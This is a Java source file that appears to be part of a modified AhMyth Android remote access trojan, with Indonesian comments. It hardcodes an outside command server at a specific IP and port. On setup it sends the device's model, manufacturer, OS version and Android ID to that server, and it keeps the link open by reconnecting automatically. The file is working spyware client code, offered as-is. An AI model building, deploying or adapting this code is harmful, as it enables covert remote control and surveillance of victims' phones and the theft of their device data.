package ahmyth.mine.king.ahmyth;

import android.os.Build;
import android.provider.Settings;
import android.content.Context;
import android.content.SharedPreferences;
import java.net.URISyntaxException;
import io.socket.client.IO;
import io.socket.client.Socket;

public class IOSocket {
    private static IOSocket ourInstance = new IOSocket();
    private io.socket.client.Socket ioSocket;

    // ===============================================
    // HARDCODE IP SERVER ANDA DI SINI (IP VPS)
    // ===============================================
    private static final String SERVER_URL = "http://41.216.190.191:42474";

    private static final String PREFS_NAME = "AnratPrefs";
    private static final String KEY_PAIRING_CODE = "pairing_code";
    private static final String KEY_IS_PAIRED = "is_paired";

    private IOSocket() {
        // Constructor kosong
    }

    public static IOSocket getInstance() {
        return ourInstance;
    }

    /**
     * Inisialisasi socket dengan pairing code
     * IP server sudah fixed, tinggal kirim pairing code
     */
    public void initSocket(Context context, String pairingCode) {
        try {
            // Simpan pairing code
            SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
            prefs.edit()
                    .putString(KEY_PAIRING_CODE, pairingCode)
                    .putBoolean(KEY_IS_PAIRED, true)
                    .apply();

            // Dapatkan device ID
            String deviceID = Settings.Secure.getString(
                    context.getContentResolver(),
                    Settings.Secure.ANDROID_ID
            );

            // Konfigurasi socket
            IO.Options opts = new IO.Options();
            opts.timeout = 10000;
            opts.reconnection = true;
            opts.reconnectionDelay = 5000;
            opts.reconnectionDelayMax = 60000;

            // Buat URL dengan pairing code di query string
            String fullUrl = SERVER_URL +
                    "?model=" + android.net.Uri.encode(Build.MODEL) +
                    "&manf=" + android.net.Uri.encode(Build.MANUFACTURER) +
                    "&release=" + android.net.Uri.encode(Build.VERSION.RELEASE) +
                    "&id=" + deviceID +
                    "&pairing_code=" + pairingCode;  // ← KUNCI UTAMA!

            ioSocket = IO.socket(fullUrl, opts);

        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
    }

    /**
     * Reconnect dengan pairing code tersimpan
     */
    public void reconnectWithSavedData(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        String pairingCode = prefs.getString(KEY_PAIRING_CODE, null);

        if (pairingCode != null) {
            initSocket(context, pairingCode);
        }
    }

    /**
     * Cek apakah sudah paired
     */
    public boolean isPaired(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getBoolean(KEY_IS_PAIRED, false);
    }

    /**
     * Dapatkan pairing code tersimpan
     */
    public String getSavedPairingCode(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        return prefs.getString(KEY_PAIRING_CODE, null);
    }

    /**
     * Clear pairing data (untuk unpair)
     */
    public void clearPairing(Context context) {
        SharedPreferences prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE);
        prefs.edit().clear().apply();

        if (ioSocket != null) {
            ioSocket.disconnect();
            ioSocket = null;
        }
    }

    public Socket getIoSocket() {
        return ioSocket;
    }
}